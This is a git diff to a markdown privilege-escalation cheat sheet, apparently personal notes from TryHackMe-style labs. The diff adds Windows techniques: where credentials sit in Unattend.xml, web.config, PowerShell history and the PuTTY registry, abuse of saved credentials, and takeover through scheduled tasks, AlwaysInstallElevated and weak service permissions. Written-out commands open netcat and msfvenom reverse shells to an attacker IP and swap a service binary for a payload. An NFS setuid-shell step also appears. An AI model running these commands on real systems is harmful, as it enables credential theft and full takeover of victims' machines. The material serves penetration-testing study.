@@ -140,10 +140,66 @@ Function Shortcut
 - *On attacker machine*
   - showmount -e <target-IP>
   - mkdir /tmp/backuponAttackerMachine
-  - mount -o rw <target-IP>:<NFS-file> /tmp/backuponAttackerMachine `mount -o rw 10.10.10.19:/backups /tmp/backuponAttackerMachine.`
+  - mount -o rw <target-IP>:<NFS-file> /tmp/backuponAttackerMachine `eg: mount -o rw 10.10.10.19:/backups /tmp/backuponAttackerMachine.`
   - nano nfs.c `spawn a /bin/bash shell`
   - gcc nfs.c -o nfs -w `compile nfs.c`
   - chmod +s nfs  
   
 # Windows Privilage Escalation
- 
+
+# Unattended Windows Installations
+Usual files that may contain credentials:
+  - C:\Unattend.xml
+  - C:\Windows\Panther\Unattend.xml
+  - C:\Windows\Panther\Unattend\Unattend.xml
+  - C:\Windows\system32\sysprep.inf
+  - C:\Windows\system32\sysprep\sysprep.xml
+
+# Powershell History
+  - type {user-profile}\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+  
+# Saved Windows Credentials
+  - cmdkey /list
+  - runas /savecred /user:{user} cmd.exe
+  
+# IIS Configuration
+  `We can find web.config in one of the following locations:`
+  - C:\inetpub\wwwroot\web.config
+  - C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+- CMD:
+  - type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+  - type C:\inetpub\wwwroot\web.config | findstr connectionString
+- Powershell:
+  - cat C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+  - cat C:\inetpub\wwwroot\web.config | findstr connectionString
+  
+# Retrieve Credentials from Software: PuTTY
+  - reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "ProxyPassword" /s `search under the following registry key for ProxyPassword`
+  
+# Scheduled Tasks
+  - schtasks `Lists all scheduled tasks`
+  - schtasks /query /tn {TASK_NAME} /fo list /v  `List detailed information about the task specific`
+  - icacls {Task to run} `To check the file permissions on the executable`
+- *if able to modify the executable, you are able to execute scripts/reverse shell*
+  - echo c:\tools\nc64.exe -e cmd.exe {ATTACKER_IP} {ATTACKER_LISTENING_PORT} > {Task to run} `eg: echo c:\tools\nc64.exe -e cmd.exe 10.10.10.18 4444 > C:\tasks\schtask.bat`
+  
+# AlwaysInstallElevated
+- *Requires these two values to be set*
+  - reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+  - reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+- *Use msfvenom to generate a malicious installer*
+  - msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
+  - msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
+
+# Insecure Permissions on Service Executable
+  - sc qc {taskname} `sc qc WindowsScheduler`
+  - icacls {path} `check permissions, eg: icacls C:\PROGRA~2\SYSTEM~1\WService.exe`
+- *if able to edit the folder content/file*
+- *On attacker machine*
+  - msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
+- *on target machine*
+  - *move the payload from attacker machine to the target machine*
+  - move WService.exe WService.exe.bkp `move legitimate .exe to .bkp`
+  - move C:\Users\thm-unpriv\rev-svc.exe WService.exe `move payload to legitmate location with same name`
+  - icacls WService.exe /grant Everyone:F `grant permissions to the payload to everything`
+  
